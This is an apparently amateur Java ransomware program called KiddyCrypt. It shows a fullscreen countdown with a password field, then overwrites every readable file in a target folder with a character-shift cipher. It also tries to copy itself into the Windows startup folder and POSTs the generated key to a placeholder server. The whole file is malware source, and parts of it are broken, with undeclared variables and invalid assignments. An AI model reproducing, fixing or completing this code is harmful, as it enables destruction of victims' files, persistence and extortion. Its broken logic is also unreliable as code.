import javax.swing.*;
import java.awt.*;
import java.io.*;
import java.nio.file.FileVisitOption;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.*;
import java.util.List;
import static sun.awt.util.SystemInfo.*;

class KiddyCrypt extends JFrame {
    /************
     * settings */
    private final String pass = "pass";
    // private final ArrayList<String> key = new ArrayList<>() = {"q","w","e","r","t","y"};
    private final String pathWIN = "C:\\Users\\root\\Desktop\\cryptMyFiles\\"; // need C:\\windows\\*
    private final String pathUNI = "/home/racer/Desktop/cryptMyFiles/";
    private int timerInt = 30;
    /************
    * sys fields */
    private final String os;
    private final String cmd_exe = "C:\\Windows\\system32\\cmd.exe";
    private final String toAutorunWin = "copy C:\\Users\\user\\Desktop\\KiddyEncryption.jar C:\\Documents and Settings\\All Users\\Главное меню\\Программы\\Автозагрузка";
    private final String targetFile;
    private final JLabel timerTv; 
    protected final JTextField passEt;
    private boolean flag = true;

    public KiddyCrypt () {
        /***********************
         *      INTERFACE      *
         ***********************/
        super("kiddy_crypt");
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE); // parameters
        setSize(2000, 1050);
        setLocation(-5, 0);

        timerTv = new JLabel();
        passEt = new JTextField(15);
        JPanel contents = new JPanel(new FlowLayout(FlowLayout.CENTER)); // content
        contents.add(timerTv);
        contents.add(passEt);
        contents.setBackground(Color.black);
        setContentPane(contents);
        /*********************
         *       LOGIC       *
         *********************/
        // listeners button
        passEt.addActionListener(e -> {
            if (passEt.getText().equals(pass)) {
                flag = false;
            } else passEt.setText("Nope ^_^ Nope");
        });
        //osDetection
        if (isWindows) { os = "win"; } // write func's
        else if (isUnix) { os = "uni"; } 
        else if (isMac) { os = "mac"; } 
        else os = "android";
        //logic
        final Thread thread = new Thread(() -> {
            while (timerInt > 0 && flag) {	// timer
                timerInt--;
                try { Thread.sleep(1100);
                } catch (InterruptedException e) { e.printStackTrace(); }
                timerTv.setText("Your time: "+ timerInt + " pass:");
            }
            if (!flag) { System.exit(0); // if timer is empty
            } else if (flag && timerInt == 0) {
                passEt.setText("bye, people");
                try {
                	// generation key
                	String key;
                	for (int i = 0; i < 512; i++) {key.append(Math.random() * (122 - 97) + 1); }
                    List<String> processScheduler = new ArrayList<>();

                	// execute command at console 
                    if (os.equals("win")) { processScheduler.add(cmd_exe);
                    } else if (os.equals("uni")){ processScheduler.add("bin\\bash.sh"); }
                    ProcessBuilder pBuilder = new ProcessBuilder(processScheduler);
                    pBuilder.start();
                    Console cmd_exec = System.console();
                    if (cmd_exec != null) { // if you can get obj of Console
                    	Console cpToAutorun = cmd_exec.printf(toAutorunWin);
                       	Console goToRoot = cmd_exec.printf("cd");
                       	Console goToTarget = cmd_exec.printf("cd C:\\Windows");
                       	cmd_exec.flush();
                    } else { System.out.println("Console: Ups.. obj of console don't get"); }
                    
                    // encryption
                    List<String> currentDirs = new ArrayList<>(); // C:\\windows\\*
                    if (os.equals("win")) {
                        Files.walk(Paths.get(pathWIN), FileVisitOption.FOLLOW_LINKS)
                                .map(Path::toFile)
                                .forEach(f -> {
                                	// added expansion
                                    if (f.isFile() && f.canRead() && f.canWrite()) {
                                        currentDirs.add(f.getName());
                                    }
                                });
                        for (int i = 0; i < currentDirs.size(); i++){
                        	int fr, keyCharsCounter = 0, plainText_num, basic, offset, p_int;
                        	char p;

                        	// read*
                            targetFile = pathWIN + currentDirs.get(i); 
                           	FileInputStream fis = new FileInputStream(targetFile);
                           	ArrayList<String> userText = new ArrayList<>();
                           	while((f = fis.read())!= -1){ userText.add(String.valueOf((char)f)); }
                           	fis.close();

                            // edit*
                            StringBuilder chiphroText = new StringBuilder();
                            for (String m : userText) {
                            	basic = (int) m.charAt(0); // text
                            	offset = (int) key.charAt(keyCharCounter) - 97; // key
                            	keyCharCounter++;
                            	p_int = basic + offset;
                            	if (p_int > 122) { // 97 - 122 ascii
                            		p = (char) (p_int - 25); // from start of alphabet
                            	} else p = (char) p_int;
                                chiphroText.append(p);
                            }
                            // write* 
                            FileOutputStream fos = new FileOutputStream(targetFile);
                            // , true (its append) -- write of the end
                            fos.write(chiphroText.toString().getBytes());
                            fos.close();
                        }
                    } else if (os.equals("uni")) {
                    	// write
                    }

                    // sent key
                    HttpClient httpclient = HttpClients.createDefault();
					HttpPost httppost = new HttpPost("http://domain/index.php");

					// Request parameters and other properties.
					List<NameValuePair> params = new ArrayList<NameValuePair>(1);
					params.add(new BasicNameValuePair("key", key));
					httppost.setEntity(new UrlEncodedFormEntity(params, "UTF-8"));

					//Execute and get the response.
					HttpResponse response = httpclient.execute(httppost);
					HttpEntity entity = response.getEntity();

					if (entity != null){
					    try (InputStream instream = entity.getContent()) {
					        // view id for usres
					    }
					}
                } catch (IOException e) { e.printStackTrace(); }
                System.exit(0);
            }
        });
        thread.start();
    }
    public static void main(String[] args) { // start point of this app
        KiddyCrypt app = new KiddyCrypt();
        app.setVisible(true);
    }
}